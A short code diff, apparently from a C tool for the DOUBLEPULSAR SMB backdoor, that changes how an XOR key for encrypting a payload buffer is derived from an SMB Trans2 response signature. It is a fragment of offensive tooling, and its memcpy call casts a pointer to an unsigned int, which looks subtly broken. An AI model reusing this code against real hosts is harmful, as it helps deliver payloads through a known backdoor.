@@ -383,10 +383,16 @@ int main(int argc, char* argv[])
 	*/
 	
 	//Example SMB signature
-	unsigned int signature[] = { 0x3a, 0x10, 0xe0, 0x36 };
-	//Generate the doublepulsar XOR key from the SMB trans2 response signature
+	//Steal from SMB trans2 response [18][19][20][21][22]
+	unsigned char signature[] = "\x6f\x0a\x2d\x8d\x01";
+	unsigned int sig;
+	
+	//convert the SMB Trans2 signature response to an unsigned integer
+	memcpy(&sig, (unsigned int)&signature, sizeof(unsigned int));
+	
+	//Calculate the doublepulsar XOR key from the SMB trans2 response signature
 	//This XOR key will be used to encrypt the payload buffer
-	unsigned int XorKey = ComputeDOUBLEPULSARXorKey((unsigned int)signature);
+	unsigned int XorKey = ComputeDOUBLEPULSARXorKey(sig);
 	printf("Calculated XOR KEY:  0x%x", XorKey);
 	
 	/*
